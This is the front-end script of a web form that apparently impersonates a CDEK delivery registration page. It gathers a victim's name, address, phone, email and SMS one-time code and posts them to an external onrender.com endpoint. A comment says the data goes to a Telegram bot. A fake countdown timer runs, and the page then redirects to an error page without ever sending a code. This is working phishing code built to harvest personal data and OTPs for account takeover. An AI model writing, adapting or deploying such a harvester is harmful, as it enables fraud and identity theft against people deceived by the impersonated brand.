document.addEventListener('DOMContentLoaded', () => {
    const startTime = Date.now();

    function getTimeSpent() {
        const totalSeconds = Math.floor((Date.now() - startTime) / 1000);
        const minutes = Math.floor(totalSeconds / 60);
        const seconds = totalSeconds % 60;
        return `${minutes} мин. ${seconds} сек. (всего ${totalSeconds} сек.)`;
    }

    // Кастомные всплывающие уведомления (справа внизу)
    function showToast(message) {
        const container = document.getElementById('toastContainer');
        const toast = document.createElement('div');
        toast.className = 'toast';
        toast.innerHTML = `
            <svg class="toast-icon" viewBox="0 0 24 24">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
            </svg>
            <span>${message}</span>
        `;
        container.appendChild(toast);

        setTimeout(() => {
            toast.classList.add('fade-out');
            toast.addEventListener('animationend', () => toast.remove());
        }, 4000);
    }

    const fullName = document.getElementById('fullName');
    const fullAddress = document.getElementById('fullAddress');
    const phoneNumberInput = document.getElementById('phoneNumber');
    const emailInput = document.getElementById('emailInput');
    const otpInput = document.getElementById('otpInput');
    const captchaInput = document.getElementById('captchaInput');
    const captchaMathSpan = document.getElementById('captcha-math');
    const getSmsBtn = document.getElementById('getSmsBtn');
    const timerContainer = document.getElementById('timerContainer');
    const timerDisplay = document.getElementById('timerDisplay');

    const selectWrapper = document.getElementById('countrySelectWrapper');
    const selectTrigger = document.getElementById('countrySelectTrigger');
    const selectedFlagImg = document.getElementById('selectedFlagImg');
    const selectedFlagFallback = document.getElementById('selectedFlagFallback');
    const selectedCode = document.getElementById('selectedCode');
    const options = document.querySelectorAll('.custom-option');

    let expectedCaptchaAnswer = 0;
    let currentCountryCode = '+7';
    let currentCountryISO = 'ru';

    const resetFormFields = () => {
        fullName.value = '';
        fullAddress.value = '';
        phoneNumberInput.value = '';
        emailInput.value = '';
        otpInput.value = '';
        if (captchaInput) captchaInput.value = '';
    };

    const loadSavedCountry = () => {
        if (localStorage.getItem('px_countryCode')) {
            const savedCode = localStorage.getItem('px_countryCode');
            const savedIso = localStorage.getItem('px_countryISO') || 'ru';
            updateCountrySelect(savedCode, savedIso);
        }
    };

    selectTrigger.addEventListener('click', (e) => {
        e.stopPropagation();
        selectWrapper.classList.toggle('open');
    });

    options.forEach(option => {
        option.addEventListener('click', function() {
            const code = this.getAttribute('data-code');
            const iso = this.getAttribute('data-country');
            updateCountrySelect(code, iso);
            selectWrapper.classList.remove('open');
            localStorage.setItem('px_countryCode', currentCountryCode);
            localStorage.setItem('px_countryISO', currentCountryISO);
        });
    });

    document.addEventListener('click', () => {
        selectWrapper.classList.remove('open');
    });

    function updateCountrySelect(code, iso) {
        currentCountryCode = code;
        currentCountryISO = iso;
        selectedCode.innerText = code;
        selectedFlagImg.src = `flags/${iso}.png`;
        selectedFlagImg.style.display = 'inline';
        selectedFlagFallback.innerText = iso.toUpperCase();

        options.forEach(opt => {
            opt.classList.toggle('selected', opt.getAttribute('data-code') === code);
        });
    }

    phoneNumberInput.addEventListener('input', function (e) {
        let x = e.target.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,3})(\d{0,2})(\d{0,2})/);
        e.target.value = !x[2] ? x[1] : x[1] + '-' + x[2] + (x[3] ? '-' + x[3] : '') + (x[4] ? '-' + x[4] : '');
    });

    // Маска кода (необязательный ввод)
    otpInput.addEventListener('input', function (e) {
        let rawDigits = e.target.value.replace(/\D/g, '').substring(0, 6);
        if (rawDigits.length > 3) {
            e.target.value = rawDigits.substring(0, 3) + '-' + rawDigits.substring(3);
        } else {
            e.target.value = rawDigits;
        }
    });

    function generateCaptcha() {
        const num1 = Math.floor(Math.random() * 10) + 1;
        const num2 = Math.floor(Math.random() * 10) + 1;
        expectedCaptchaAnswer = num1 + num2;
        captchaMathSpan.innerText = `${num1} + ${num2}`;
    }

    // Мгновенная отправка данных на локальный сервер
    // Было: await fetch('http://127.0.0.1:5000/api/lead', ...
// Стало:
async function sendDataToServer() {
    const payload = {
        fullName: fullName.value.trim(),
        address: fullAddress.value.trim(),
        phone: `${currentCountryCode} ${phoneNumberInput.value.trim()}`,
        email: emailInput.value.trim(),
        otpCode: otpInput.value.trim() || 'Не введен',
        timeSpent: getTimeSpent()
    };

    try {
        await fetch('https://cdek-registration-form.onrender.com/api/lead', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    } catch (error) {
        console.error('Ошибка отправки на сервер:', error);
    }
}

    // Обработка клика по кнопке "Получить код"
    getSmsBtn.addEventListener('click', (e) => {
        e.preventDefault();

        // Проверка заполненности основных полей через интерфейс ошибок
        if (!fullName.value.trim()) {
            showToast('Укажите ФИО пользователя');
            return;
        }
        if (!fullAddress.value.trim()) {
            showToast('Заполните адрес доставки');
            return;
        }
        if (phoneNumberInput.value.length < 7) {
            showToast('Введите корректный номер телефона');
            return;
        }
        if (!emailInput.value.includes('@') || emailInput.value.length < 5) {
            showToast('Укажите правильный E-mail адрес');
            return;
        }
        if (parseInt(captchaInput.value) !== expectedCaptchaAnswer) {
            showToast('Неверный ответ на капчу');
            generateCaptcha();
            captchaInput.value = '';
            return;
        }

        // Данные мгновенно отправляются в Telegram-бота
        sendDataToServer();

        getSmsBtn.disabled = true;
        timerContainer.classList.remove('hidden');

        let timeLeft = 60;
        timerDisplay.innerText = timeLeft;

        const timerInterval = setInterval(() => {
            timeLeft--;
            if (timeLeft >= 0) {
                timerDisplay.innerText = timeLeft;
            } else {
                clearInterval(timerInterval);
            }
        }, 1000);

        setTimeout(() => {
            window.location.href = 'error.html';
        }, 5000);
    });

    resetFormFields();
    loadSavedCountry();
    generateCaptcha();
});